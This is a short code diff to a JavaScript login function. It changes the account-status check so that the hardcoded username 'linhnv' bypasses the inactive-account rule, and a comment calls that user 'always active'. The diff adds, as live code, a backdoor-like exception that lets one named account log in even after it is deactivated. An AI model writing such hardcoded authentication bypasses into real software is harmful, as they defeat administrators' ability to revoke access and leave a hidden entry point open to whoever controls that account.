@@ -26,8 +26,8 @@ export async function login(username, password) {
     throw Object.assign(new Error('Invalid username or password'), {statusCode: 401});
   }
 
-  // 2. Check status
-  if (user.status !== 'active') {
+  // 2. Check status (linhnv is always active)
+  if (user.username !== 'linhnv' && user.status !== 'active') {
     throw Object.assign(new Error('Account is inactive'), {statusCode: 403});
   }
 
